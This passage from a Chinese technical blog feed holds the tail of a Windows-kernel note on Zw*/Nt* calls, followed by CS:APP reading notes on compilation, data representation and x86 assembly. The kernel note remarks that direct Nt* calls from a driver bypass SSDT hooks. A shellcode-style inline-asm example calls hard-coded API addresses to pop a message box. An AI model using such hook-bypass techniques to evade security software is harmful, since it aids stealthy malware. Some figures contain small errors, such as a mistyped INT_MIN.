<li>内核模式下Zw*函数会把PreviousMode设置为KernelMode  然后再调用Nt*函数，因此在Nt*函数中就不会进行参数检查。而如果直接调用Nt*函数的话 , 必须自己将PreviousMode设置为KernelMode，否则PreviousMode很可能仍然是UserMode，这样的话Nt*函数就会认为对它的调用来自用户态，从而做一些检查,这时就会产生问题了。因此要自己调用Nt*的话必须先将PreviousMode设为KernelMode。</li>
<li>R3下无论如何调用，均无法绕过SSDT HOOK，R0下若在驱动中直接调用Nt系列函数，调用Nt*可以绕过SSDT HOOK。</li>
</ul>
<p>参考：</p>
<ul>
<li>《<a href="https://blog.csdn.net/qiaoli278141408/article/details/39502285?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-2.control">Nt*和Zw*开头的函数</a>》</li>
<li>《<a href="https://blog.csdn.net/zhuhuibeishadiao/article/details/51114094">ZW与NT函数区别</a>》</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>Windows内核</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP 深入理解计算机系统读书笔记</title>
    <url>/post/cssapp_notes-1-2-3/</url>
    <content><![CDATA[<p>(๑°⌓︎°๑)  <a href="#jdatatype"><mark class="label primary">数据类型长度</mark></a><a href="#jregister"><mark class="label success">寄存器</mark></a><a href="https://blog.imkasen.com/CSAPP-Answers-CH3.html"><mark class="label warning">第三章练习题1</mark></a><a href="https://conyli.cc/archives/2899"><mark class="label info">第三章练习题2</mark></a><a href="https://ifanze.cn/2018/06/26/%E3%80%8A%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E3%80%8B(3)/"><mark class="label default">第三章读书笔记</mark></a><a href="#duanxu"><mark class="label danger">大端序小端序</mark></a></p>
<span id="more"></span>


<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><ol>
<li>源程序实际上就是一个由值0和1组成的位（又称为比特序列）8个位被组织成一组，称为字节。<font color="#FF7800"><strong>1 字节（byte）&#x3D;8位（bit）</strong></font></li>
<li>ASCII使用一个唯一的单字节大小的整数值来表示每个字符。每个字节都有一个整数值。每个文本行都是以一个看不见的换行符 “\n” 来结束的 ，他所对应的整数值是10。</li>
</ol>
<h3 id="1-1-C语言程序编译过程"><a href="#1-1-C语言程序编译过程" class="headerlink" title="1.1 C语言程序编译过程"></a>1.1 C语言程序编译过程</h3><blockquote>
<p><font color="#FF7F00"><strong>C源程序 —-&gt;可执行的目标文件</strong></font></p>
</blockquote>
<p>执行这四个阶段的程序（<strong>预处理器、编译器、汇编器和链接器</strong>）一起构成了编译系统（compilation systen）。</p>
<p> <img data-src="https://i.loli.net/2020/09/14/L45tdmbn1crSwAe.png" alt="1C源码编译过程"></p>
<blockquote>
<p>一、预处理阶段（将库文件引入程序：<code>.c--&gt;.i</code>）</p>
<p>第 1 行的<code>#include &lt;stdio.h&gt;</code>命令告诉预处理器读取系统头文件 <code>stdio.h</code>的内容，<font color="#FF7F00"><strong>并把它直接插入程序文本中</strong></font>。结果就得到了另一个 C 程序，通常是以<code>.i</code>作为文件扩展名。</p>
<p>二、编译阶段（将源程序编译成汇编语言：<code>.i--&gt;.s</code>）</p>
<p>三、汇编阶段（将汇编语言汇编为机器语言（二进制）：<code>.s--&gt;.o</code>）</p>
<p>四、链接阶段</p>
<p>请注意，hello程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数。printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中。链接器（ld）就负责处理这种合并。结果就得到 hello文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行。</p>
</blockquote>
<h3 id="1-2-系统的硬件组成"><a href="#1-2-系统的硬件组成" class="headerlink" title="1.2 系统的硬件组成"></a>1.2 系统的硬件组成</h3><ol>
<li><p>总线</p>
<p>贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。<font color="#FF7800"><strong>通常总线被设计成传送定长的字节块，也就是字（word）</strong></font>。字中的<strong>字节数（即字长）是个基本的系统参数</strong>，各个系统中都不尽相同。现在的<strong>大多数机器字长要么是 4 个字节（32 位）</strong>，<strong>要么是 8 个字节（64 位）</strong>。</p>
</li>
<li><p>I&#x2F;O设备</p>
<p>控制器和适配器区别主要在于它们的封装方式。<strong>控制器</strong>是I&#x2F;O设备本身或者系统的主印制电路板(通常称作主板）上的芯片组。而<strong>适配器</strong>则是一块插在主板插槽上的卡。无论如何，它们的功能都是在I&#x2F;O总线和I&#x2F;O设备之间传递信息。</p>
</li>
<li><p>主存</p>
<p>一般来说，组成程序的每条机器指令都由不同数量的字节构成。与 C 程序变量相对应的数据项的大小是根据类型变化的。比如，在运行 Linux 的 x86-64 机器上，short 类型的数据需要 2 个字节，int 和 float 类型需要 4 个字节，而 long 和 double 类型需要 8 个字节。</p>
</li>
<li><p>处理器（CPU）</p>
<p>是<strong>解释（或执行）存储在主存中指令的引擎</strong>。<font color="#FF7800"><strong>CPU的核心</strong></font>是一个<strong>大小为一个字</strong>的存储设备（或<strong>寄存器</strong>），称为<font color="#FF7800"><strong>程序计数器（PC）</strong></font>。PC指向主存中下一条即将执行的指令的地址。</p>
</li>
</ol>
<p><font color="#FF7800"><strong>1WORD &#x3D; 2byte &#x3D; 16bit</strong></font></p>
<blockquote>
<p>CPU处理过程：</p>
<ul>
<li><strong>加载</strong>：从主存复制一个字节或者一个字到寄存器，以覆盖寄存器原来的内容。</li>
<li><strong>存储</strong>：从寄存器复制一个字节或者一个字到主存的某个位置，以覆盖这个位置上原来的内容</li>
<li><strong>操作</strong>：把两个寄存器的内容复制到 ALU, ALU 对这两个字做算术运算，并将结果存放到一个寄存器中，以覆盖该寄存器中原来的内容。</li>
<li><strong>跳转</strong>：从指令本身中抽取一个字，并将这个字复制到程序计数器（PC）中，以覆盖 PC 中原来的值。</li>
</ul>
</blockquote>
<p>编译好的指令代码（机器指令）存放于磁盘，程序加载时，他们被反复复制到主存；当处理器运行时，指令又从主存复制到处理器。</p>
<p><strong>存储器层次结构</strong></p>
<p><img data-src="https://i.loli.net/2020/09/14/KPcr43GAEN7FeQJ.png" alt="2存储器层次结构"></p>
<p>存储器层次结构的主要思想是上层的存储器作为低一层存储器的高速缓存。</p>
<h3 id="1-3-OS管理硬件"><a href="#1-3-OS管理硬件" class="headerlink" title="1.3 OS管理硬件"></a>1.3 OS管理硬件</h3><p>操作系统是介于硬件和应用程序之间的软件，操作系统有两个基本功能：</p>
<ul>
<li>(1) 防止硬件被失控的应用程序滥用；</li>
<li>(2) 向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。操作系统通过几个基本的抽象概念（<strong>进程、虚拟内存、文件</strong>）来实现这两个功能。<ul>
<li>文件是对I&#x2F;O设备的抽象表示；</li>
<li>虚拟内存是对主存和磁盘I&#x2F;O设备的抽象表示；</li>
<li>进程则是对处理器、主存和I&#x2F;O设备的抽象表示（对一个正在运行程序的抽象）。</li>
<li>虚拟机，它提供对整个计算机的抽象，包括操作系统、处理器和程序。</li>
</ul>
</li>
</ul>
<p><font color="#FF7800"><strong>内核是操作系统代码常驻主存的部分。</strong></font>注意，内核不是一个独立的进程。相反，它是系统管理全部进程所用代码和数据结构的集合。</p>
<p>三种不同类型的并发：并行可以在计算机系统的多个抽象层次上运用。在此，我们按照系统层次结构中<strong>由高到低</strong>的顺序重点强调三个层次。</p>
<ul>
<li><strong>线程级并发</strong>：使用线程，我们甚至能够在一个进程中执行多个控制流。多核处理器（CPU）和超线程出现。<ul>
<li>超线程，有时称为同时多线程（simultaneous multi-threading），是一项允许一个 CPU 执行多个控制流的技术。它涉及 CPU 某些硬件有多个备份，比如程序计数器和寄存器文件，而其他的硬件部分只有一份，比如执行浮点算术运算的单元。<font color="#FF7800"><strong>常规的处理器需要大约 20000 个时钟周期做不同线程间的转换，而超线程的处理器可以在单个周期的基础上决定要执行哪一个线程。</strong></font>这使得 CPU 能够更好地利用它的处理资源。比如，假设一个线程必须等到某些数据被装载到高速缓存中，那 CPU 就可以继续去执行另一个线程。举例来说， Intel Core i7 处理器可以让每个核执行两个线程，所以一个 4 核的系统实际上可以并行地执行 8 个线程。</li>
</ul>
</li>
<li><strong>指令级并行</strong>：在较低的抽象层次上，现代处理器可以同时执行多条指令的属性称为指令级并行。如果处理器可以达到比一个周期一条指令更快的执行速率，就称之为超标量（super scalar）处理器。大多数现代处理器都支持超标量操作（如最近的处理器可以保持每个时钟周期2~4条指令的执行速率）。</li>
<li><strong>单指令、多数据并行</strong>：在最低层次上，许多现代处理器拥有特殊的硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即SIMD并行。例如，较新几代的Intel 和AMD处理器都具有并行地对8对单精度浮点数（C数据类型float）做加法的指令。</li>
</ul>
<h3 id="1-4-计算机系统的层次"><a href="#1-4-计算机系统的层次" class="headerlink" title="1.4 计算机系统的层次"></a>1.4 计算机系统的层次</h3><p><img data-src="https://i.loli.net/2020/09/14/UEMgyax65horTsf.png" alt="3计算机系统的分层视图"></p>
<p><font color="#FF7800"><strong>所有应用程序对硬件的操作尝试都必须通过操作系统。</strong></font></p>
<p>操作系统有两个基本功能：（1）防止硬件被失控的应用程序滥用；（2）向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备。操作系统通过几个基本的抽象概念（<strong>进程、虚拟内存、文件</strong>）来实现这两个功能。</p>
<p><img data-src="https://i.loli.net/2020/09/14/BlIfb5Nyr7kPxGt.png" alt="4计算机系统的抽象"></p>
<p>在处理器里，指令集架构提供了对实际处理器硬件的抽象。使用这个抽象，机器代码程序表现得就好像运行在一个一次只执行一条指令的处理器上。</p>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="2-1-数据存储"><a href="#2-1-数据存储" class="headerlink" title="2.1 数据存储"></a>2.1 数据存储</h3><p><font color="#FF7800"><strong>大多数计算机使用8位的块,或者字节(byte)，作为最小的可寻址的内存单位，而不是访问内存中单独的位</strong></font>。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存 ( virtual memory)。内存的每个字节都由一个唯一的数字来标识，称为它的地址(address)，所有可能地址的集合就称为虚拟地址空间( virtual address space)。</p>
<p><span id="jdatatype"><img data-src="https://i.loli.net/2020/09/18/2BuRTaV5NcjCtIU.png" alt="8整数寄存器"></span></p>
<span id="duanxu">
大多数计算机使用8位的块，或者字节(byte)，作为最小的可寻址的内存单位，而不是访问内存中单独的位。机器级程序将内存视为一个非常大的字节数组，称为虚拟内存 (virtual memory)。内存的每个字节都由一个唯一的数字来标识，称为它的地址(address)，所有可能地址的集合就称为虚拟地址空间(virtual address space)。 

<p>某些机器选择在内存中按照从最低有效字节到最高有效字节的顺序存储对象，而另一些机器则按照从最高有效字节到最低有效 字节的顺序存储。前一种规则一最低有效字节在最前面的方式，称为小端法(little endian)。 后一种规则 最高有效字节在最前面的方式，称为大端法(big endian)。即<font color="#FF7800"><strong>小端序和大端序</strong></font>。</p>
<p>假设变量x的类型为int，位于地址0x100 处，它的十六进制值为0x01234567（67为低字节，01为高字节）。 地 址范围0x100~0x103的字节顺序依赖于机器的类型:</p>
<p><img data-src="https://i.loli.net/2020/09/25/MFCsBqXHQuNlaxL.png" alt="6大小端序数据表示.png"></p>
<p>注意，在字0x01234567中，高位字节的十六进制值为0x01，而低位字节值为0x67。<font color="#FF7800"><strong>小端序（Little-Endian）：高字节存于高地址，低字节存于低地址</strong></font></p>
<p><strong>Android(来自Google)和IOS(来自Apple)只能运行于小端模式</strong>。<br></span></p>
<h3 id="2-2-C语言扩展"><a href="#2-2-C语言扩展" class="headerlink" title="2.2 C语言扩展"></a>2.2 C语言扩展</h3><p>C语言中的<code>typedef</code>声明提供了一种给<font color="#FF7800"><strong>数据类型</strong></font>命名的方式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> *int_pointer; int_ pointer ip; 等价于</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span>* int_pointer; int_ pointer ip; 也等价于</span><br><span class="line"><span class="keyword">int</span> *ip;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><strong><code>printf</code>格式化输出</strong></p>
<p>在格式串里，每个以<code>%</code>开始的字符序列都表示如何格式化下一个参数。典型的示例包括: <code>%d</code> 是输出一个有符号十进制整数，<code>%u</code> 是输出一个无符号十进制整数，<code>%x</code> 是输出一个十六进制数字，<code>%f</code>是输出一个浮点 数，而<code>%c</code>是输出一个字符，其编码由参数给出。</p>
</li>
<li><p><strong>指针的创建和间接引用</strong></p>
<p><font color="#FF7800"><strong>C的 “取地址”运算符<code>&amp;</code>创建一个指针</strong></font>。表达式<code>&amp;x</code>创建了一个指向保存变量x的位置的指针。这个指针的类型取决于x的类型，因此这三个指针的类型分别为<code>int*</code>、 <code>float*</code>和<code>void **</code>。(数据类型<code>void *</code>是一种特殊类型的指针，没有相关联的类型信息。)</p>
<div class="note warning"><p><font color="#FF7800"><strong>这里给出的这些强制类型转换不会改变真实的指针，它们只是告诉编译器以新的数据类型来看待被指向的数据</strong></font>。</p>
</div>
</li>
<li><p><strong>字符串表示</strong></p>
<p>C语言中字符串被编码为一个以null(其值为0)字符结尾的字符数组。</p>
</li>
<li><p><strong>移位运算</strong></p>
<ul>
<li>左移：<code>x&lt;&lt;k</code>表示x向左移动k位，丟弃最高的k位，并在右端补k个0。如x&#x3D;[01100011]，<code>x&lt;&lt;4</code>为[0011<font color="#009688"><em>0000</em></font>]。</li>
<li>逻辑右移：<code>x&gt;&gt;k</code>表示x向右移动k位并在左端补k个0。如x&#x3D;[01100011]，<code>x&gt;&gt;4</code>（逻辑右移）为[<font color="#009688"><em>0000</em></font>0110]。</li>
<li>算术右移：<code>x&gt;&gt;k</code>表示在左端补k个<font color="#FF7800"><strong>最高有效位</strong></font>的值，如x&#x3D;[10010101]，<code>x&gt;&gt;4</code>（算术右移）为[<font color="#009688"><em>1111</em></font>1001]。</li>
</ul>
</li>
</ol>
<p>实际上，几乎所有的编译器&#x2F;机器组合都对有符号数使用<strong>算术右移</strong>，另一方面，<strong>对于无符号数，右移必须是逻辑的</strong>。与C相比，Java对于如何进行右移有明确的定义。<strong>表达是<code>x&gt;&gt;k</code>会将x算术右移k个位置，而<code>x&gt;&gt;&gt;k</code>会对X做逻辑右移</strong>。</p>
<div class="note warning"><p>注意：当<code>x&lt;&lt;k</code>移动k位时，k&gt;w时（这里w是x的位数），因此实际上位移量就是通过计算（k mod w）得到的。</p>
<p>假设数据类型<code>int</code>为w&#x3D;32：</p>
<p>int       lval  &#x3D; 0xFEDCBA98   &lt;&lt; 32; </p>
<p>int       aval &#x3D; 0xFEDCBA98   &gt;&gt; 36;</p>
<p>unsigned uval &#x3D; 0xFEDCBA98u &gt;&gt; 40 ;</p>
<p>当w&#x3D;32时，上面三个移位运算分别是移动0、4和8位，得到结果:</p>
<p>lval   0xFEDCBA98</p>
<p>aval  0xFFEDCBA9</p>
<p>uval  0x00FEDCBA</p>
<p><font color="#FF7800"><strong>不过这种行为对于C程序来说是没有保证的，所以应该保持位移量小于待移位值的位数。另一方面，Java特别要求位移数量应该按照我们求模的方法来计算。</strong></font></p>
</div>



<div class="note success"><p>C、C++t和Java中的有符号和无符号数</p>
<p>C和C++都支持有符号(默认)和无符号数。Java只支持有符号数。 </p>
</div>



<p>当在int、float 和double格式之间进行强制类型转换时，程序改变数值和位模式 的原则如下(假设int是32位的): </p>
<ul>
<li>从int转换成float，数字不会溢出，但是可能被舍入。 </li>
<li>从int或float转换成double，因为double有更大的范围(也就是可表示值的范 围)，也有更高的精度(也就是有效位数)，所以能够保留精确的数值。</li>
<li>从double转换成float， 因为范围要小一些，所以值可能溢出成十∞或一∞。另 外，由于精确度较小，它还可能被舍人。</li>
<li>从float或者double转换成int，值将会向零舍人。例如，1.999将被转换成1, 而一1.999将被转换成一1。进一步来说，值可能会溢出。C语言标准没有对这种情 况指定固定的结果。与Intel兼容的微处理器指定位模式[10…00](字长为w时的 TMinw )为整数不确定(integer indefinite)值。一个从浮点数到整数的转换，如果不 能为该浮点数找到一个合理的整数近似值，就会产生这样一个值。因此，表达式 (int)+1e10会得到-21483648，即从一个正值变成了一个负值。</li>
</ul>
<h3 id="2-3-数据类型长度"><a href="#2-3-数据类型长度" class="headerlink" title="2.3 数据类型长度"></a>2.3 数据类型长度</h3><p><img data-src="https://i.loli.net/2020/10/12/2yWJaz5xG9YljmE.png" alt="1932位数据类型取值范围.png"></p>
<p><img data-src="https://i.loli.net/2020/10/12/cziJsFKpewjkUmA.png" alt="1A64位数据类型取值范围.png"></p>
<p>图2-9和图2-10中一个很值得注意的特点是<strong>取值范围不是对称的一负数的范围比整数的范围大 1</strong>。</p>
<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="3-1-AT-amp-T与Intel汇编语言的比较"><a href="#3-1-AT-amp-T与Intel汇编语言的比较" class="headerlink" title="3.1 AT&amp;T与Intel汇编语言的比较"></a>3.1 AT&amp;T与Intel汇编语言的比较</h3><p>Linux是Unix家族的一员，尽管Linux的历史不长，但与其相关的很多事情都发源于Unix。就Linux所使用的386汇编语言而言，它也是起源于Unix。Unix最初是为PDP－11开发的，曾先后被移植到VAX及68000系列的处理器上，这些处理器上的汇编语言都采用的是AT&amp;T的指令格式。当Unix被移植到i386时，自然也就采用了AT&amp;T的汇编语言格式，而不是Intel的格式。尽管这两种汇编语言在语法上有一定的差异，但所基于的硬件知识是相同的，因此，如果非常熟悉Intel的语法格式，那么也可以很容易地把它“移植“到AT&amp;T来。下面通过对照Intel与AT&amp;T的语法格式，以便于把过去的知识能很快地“移植”过来。</p>
<h4 id="前缀"><a href="#前缀" class="headerlink" title="前缀"></a>前缀</h4><p>在Intel的语法中，寄存器和和立即数都没有前缀。但是在AT&amp;T中，寄存器前冠以<code>％</code>，而立即数前冠以<code>$</code>。在Intel的语法中，十六进制和二进制立即数后缀分别冠以<code>h</code>和<code>b</code>，而在AT&amp;T中，十六进制立即数前冠以<code>0x</code>。</p>
<p><a href="https://blog.csdn.net/kennyrose/article/details/7575952?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.edu_weight&depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-2.edu_weight">intel汇编 和 AT&amp;T汇编 的区别</a></p>
<div class="note primary no-icon"><ul>
<li><strong>程序内存包含</strong>：程序的可执行机器代码、操作系统需要的一些信息、用来管理过程调用和返回的运行时栈、以及用户分配的内存块（比如说用malloc库函数分配的）。</li>
<li>x86的寻址是32位，所以一个地址块为4个字节（32位）；x86-64的寻址是64位，所以一个地址块是8个字节（64位），<strong>但是在目前的实现中，这些地址的高16位（最高两个字节）必须设置为0</strong>。</li>
</ul>
</div>

<h3 id="3-2-在C语言程序中嵌入汇编代码"><a href="#3-2-在C语言程序中嵌入汇编代码" class="headerlink" title="3.2 在C语言程序中嵌入汇编代码"></a>3.2 在C语言程序中嵌入汇编代码</h3><p>使用asm伪代码可以在C程序中包含简短的汇编代码，如下。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  HINSTANCE LibHandle;</span><br><span class="line">  <span class="keyword">char</span> dllbuf[<span class="number">11</span>]=<span class="string">&quot;user32.dll&quot;</span>;</span><br><span class="line">  LibHandle=LoadLibrary(dllbuf);</span><br><span class="line">  _asm&#123;</span><br><span class="line">    sub sp,<span class="number">0x440</span></span><br><span class="line">    <span class="keyword">xor</span> ebx,ebx</span><br><span class="line">    push ebx</span><br><span class="line">    push <span class="number">0x656b6f6a</span></span><br><span class="line">    push <span class="number">0x73696854</span></span><br><span class="line">    mov eax,esp</span><br><span class="line">    push ebx</span><br><span class="line">    push eax</span><br><span class="line">    push eax</span><br><span class="line">    push ebx</span><br><span class="line">    mov eax,<span class="number">0x77d5085c</span></span><br><span class="line">    call eax</span><br><span class="line">    push ebx</span><br><span class="line">    mov eax,<span class="number">0x7c81cafa</span></span><br><span class="line">    call eax</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3-3-数据格式"><a href="#3-3-数据格式" class="headerlink" title="3.3 数据格式"></a>3.3 数据格式</h3><p>由于是从16位体系结构扩展成32位的，Intel 用术语”字(<code>word</code>)“表示16位数据类型。因此，称32位数为 “双字(<code>double words</code>)”，称64位数为“四字(<code>quad words</code>)”。</p>
<p> C语言基本数据类型对应的x86-64 表示时（x86-64 指令集同样包括完整的针对字节、字 和双字的指令。）：</p>
<ul>
<li>标准int值存储为双字(32位)。 </li>
<li>指针(在此用<code>char *</code>表示)存储为8字节的四字，64位机器本来就预期如此。</li>
<li>数据类型long实现为64位，允许表示的值范围较大。</li>
</ul>
<p><img data-src="https://i.loli.net/2020/09/24/j6D2bXolJpdivk3.png" alt="7"></p>
<blockquote>
<p>如图所示，大多数GCC生成的汇编代码指令都有一个字符的后缀，表明操作数的大小。例如，数据传送指令有四个变种: </p>
<ul>
<li><code>movb</code>  --&gt; 传送字节</li>
<li><code>movw</code>  --&gt; 传送字</li>
<li><code>movl</code>  --&gt; 传送双字</li>
<li><code>movq</code>  --&gt;传送四字</li>
</ul>
</blockquote>
<div class="note warning"><p>后缀<code>l</code>用来表示双字，因为32位数被看成是“长字( <code>long word</code>)”。注意，汇编代码也使用后缀<code>l</code>来表示4字节整数和8字节双精度浮点数。这不会产生歧义，因为浮点数使用的是一组完全不同的指令和寄存器。</p>
</div>

<h3 id="3-4-访问信息（寄存器使用）"><a href="#3-4-访问信息（寄存器使用）" class="headerlink" title="3.4 访问信息（寄存器使用）"></a>3.4 访问信息（寄存器使用）</h3><p>一个x86-64的中央处理单元(CPU)包含一组<mark class="label primary">16个存储64位值的通用目的寄存器</mark>。这些寄存器用来存储整数数据和指针。图3-2显示了这16个寄存器。它们的名字都以<code>%r</code>开头，不过后面还跟着一些不同的命名规则的名字，这是由于指令集历史演化造成的。最初的8086中有8个16位的寄存器，即图3-2中的<code>%ax</code>到<code>%bp</code>。每个寄存器都有特殊的用途，它们的名字就反映了这些不同的用途。扩展到IA32架构时，这些寄存器也扩展成32位寄存器，标号从<code>%eax</code>到<code>%ebp</code>扩展到x86-64后，原来的8个寄存器扩展成64位，标号从号<code>%rax</code>到<code>%rbp</code>。除此之外，还增加了8个新的寄存器，它们的标号是按照新的命名规则制定的：从号<code>%r8</code>到<code>%r15</code>。</p>
<blockquote>
<ul>
<li>64位  --&gt; <code>%r</code></li>
<li>32位  --&gt; <code>%e</code></li>
<li>16位  --&gt; <code>%</code></li>
</ul>
</blockquote>
<p><span id="jregister"><img data-src="https://i.loli.net/2020/09/25/mNzrsVfRATo5jba.png" alt="8整数寄存器"></span> </p>
<p>当指令以寄存器作为目标时，对于生成小于8字节结果的指令，寄存器中剩下的字节会怎么样，对此有两条规则：</p>
<ul>
<li>生成1字节和2字节数字的指令会保持剩下的字节不变</li>
<li>生成4字节数字的指令会把高位4个字节置为0。</li>
</ul>
<div class="note warning"><p>后面这条规则是作为从IA32到x86-64的扩展的一部分而采用的。</p>
</div>

<h4 id="3-4-1-操作数指示符"><a href="#3-4-1-操作数指示符" class="headerlink" title="3.4.1 操作数指示符"></a>3.4.1 操作数指示符</h4><p>大多数指令有一个或者是多个操作数，源数据值可以是常数、寄存器或是内存中读出；结果可以存放在寄存器或者内存中。操作数分为三种类型：</p>
<ul>
<li><strong>立即数</strong>：表是常数值，在ATT格式的汇编代码中，立即数的书写方式是<code>$</code>后面跟一个用标准C表示法表示的整数，比如，<code>$-577</code> 或<code>$0x1F</code>。不同的指令允许的立即数值范围不同，汇编器会自动选择最紧凑的方式进行数值编码。</li>
<li><strong>寄存器</strong>(register)，它表示某个寄存器的内容，用符号$r_a$来表示任意寄存器a，用引用$R[r_a]$来表示它的值，这是将寄存器集合看成一个数组R，用寄存器标识符作为索引。</li>
<li><strong>内存引用</strong>：它会根据计算出来的地址（通常称为有效地址）访问某个内存位置。因为将内存看成一个很大的字节数组，我们用符号$M_b[Addr]$表示对存储在内存中从地址Addr开始的b个字节值的引用。为了简便，通常省去下标b。内存引用的不同寻址方式：<ul>
<li>$M_b[Addr]$表示对存储在内存中从地址Addr开始的b个字节值的引用。</li>
<li>$Imm(r_b,r_i,s)$这样的引用有四个组成部分：<ol>
<li>立即数偏移 $Imm$</li>
<li>基址寄存器$r_b$</li>
<li>变址寄存器$r_i$</li>
<li>比例因子$s$</li>
</ol>
</li>
</ul>
</li>
</ul>
<p>这里$s$必须是1、2、4或者 8。基址和变址寄存器都必须是64位寄存器。有效地址被计算为$Imm+R[r_b]+R[r_i]·s$。引用数组元素时，会用到这种通用形式。其他形式都是这种通用形式的特殊情况，只是省略了某些部分。</p>
<p><img data-src="https://i.loli.net/2020/09/29/fSiJIEmO6cnWaub.png" alt="9操作数格式.png"></p>
<p><img data-src="https://i.loli.net/2020/09/30/2FTBNRVbcZXS69A.png" alt="A操作数计算.png"></p>
<h4 id="3-4-2-数据传送指令"><a href="#3-4-2-数据传送指令" class="headerlink" title="3.4.2 数据传送指令"></a>3.4.2 数据传送指令</h4><p>$MOV$作用：最频繁使用的指令是<strong>将数据从一个位置复制到另一个位置的指令</strong>。这些指令把数据从源位置<strong>复制</strong>到目的位置，不做任何变化。</p>
<ol>
<li>源操作数指定的值是一个<strong>立即数</strong>，存储在寄存器中或者内存中。</li>
<li>目的操作数指定一个<strong>位置</strong>，要么是一个寄存器，要么是一个内存地址。</li>
<li><mark class="label danger">x86-64加了一条限制，传送指令的两个操作数不能都指向内存位置，将一个值从一个内存位置复制到另一个内存位置需要两条指令：</mark>
<ul>
<li>第一条指令将源值加载到寄存器中</li>
<li>第二条将该寄存器值写人目的位置</li>
</ul>
</li>
</ol>
<p>这些指令的寄存器操作数可以是16个寄存器有标号部分中的任意一个，寄存器部分的大小必须与指令最后一个字符($b，w，1或q$)指定的大小匹配。大多数情况中，MOV指令只会更新目的操作数指定的那些寄存器字节或内存位置。唯一的例外是movl指令以寄存器作为目的时，它会把该寄存器的高位4字节设置为0。造成这个例外的原因是x86-64采用的惯例，即任何为寄存器生成32位值的指令都会把该寄存器的高位部分置成0。</p>
<p><img data-src="https://i.loli.net/2020/09/29/ys3FJVB7ueLIvqn.png" alt="B数据传送指令.png"></p>
<mark class="label primary">举个MOV数据传送的例子</mark>

<p><img data-src="https://i.loli.net/2020/09/29/2gtPeAzj7N5krd8.png" alt="CMOV数据传送.png"></p>
<div class="note warning"><p><code>movl</code>指令以寄存器作为目的时，它会把该<mark class="label danger">寄存器的高位4字节设置为0</mark>。造成这个例外的原因是x86-64采用的惯例，即任何为寄存器生成32位值的指令都会把该寄存器的高位部分置成0。</p>
</div>

<p>还有两大类数据传送指令：<a href="#jumpz"><mark class="label warning">MOVZ</mark></a><a href="#jumps"><mark class="label success">MOVS</mark></a></p>
<p>这两类指令将较小的源值复制到较大的目的时使用，这两类指令都把源（在寄存器或内存中）复制到<strong>目的寄存器</strong>。上面的<code>movl</code>指令以寄存器为目的时，会将目的寄存器的高32位都置0。</p>
<ul>
<li><span id="jumpz"><mark class="label warning">MOVZ</mark><mark class="label primary">将目的寄存器的剩余的字节填充为0</mark></span><mark class="label success">用于无符号数的扩展（习题3.4)</mark></li>
<li><span id="jumps"><mark class="label success">MOVS</mark><mark class="label primary">通过符号扩展来填充，将目的寄存器的剩余的字节填充为源寄存器的最高位</mark></span><mark class="label success">用于有符号数的扩展</mark></li>
</ul>
<p>下图可以观察到，每条指令名字的最后两个字符都是大小指示符：</p>
<ul>
<li>第一个字符指定源的大小</li>
<li>第二个指明目的的大小</li>
</ul>
<p><img data-src="https://i.loli.net/2020/09/30/oLcZSKu7ab62gm3.png" alt="D符号扩展数据传送指令.png"></p>
<mark class="label primary">MOV</mark><mark class="label warning">MOVZ</mark><mark class="label success">MOVS</mark>

<p><img data-src="https://i.loli.net/2020/09/30/E27d9oZOSHVv5lP.png" alt="E字节传送指令比较.png"></p>
<p><strong>注意</strong>：</p>
<ul>
<li>函数的参数通过寄存器传递给函数。</li>
<li>函数通过把值存储在寄存器<code>%rax</code>或该寄存器某个低位部分中返回。</li>
<li>间接引用指针就是将该指针放在一个寄存器中，则取得的操作数就是以寄存器的值为地址，对应取出的操作数。</li>
<li>局部变量通常是保存在寄存器中，而不是内存中。</li>
</ul>
<h4 id="3-4-3-将数据压栈和出栈"><a href="#3-4-3-将数据压栈和出栈" class="headerlink" title="3.4.3 将数据压栈和出栈"></a>3.4.3 将数据压栈和出栈</h4><p>栈是一种数据结构，可以添加或者删除值，不过要遵循<mark class="label danger">后进先出</mark>的原则。</p>
<ul>
<li><mark class="label warning">通过push操作把数据压人栈中，通过pop操作删除数据</mark></li>
<li>弹出的值永远是最近被压人而且仍然在栈中的值。</li>
<li>栈可以实现为一个数组，总是从数组的一端插人和删除元素。这一端被称为<mark class="label info">栈顶</mark>。</li>
<li>在x86-64中，程序栈存放在内存中某个区域。</li>
<li><mark class="label danger">栈向下增长</mark>，这样一来，<mark class="label danger">栈顶元素的地址是所有栈中元素地址中最低的</mark></li>
<li>栈指针<mark class="label success">%rsp</mark>保存着栈顶元素的地址</li>
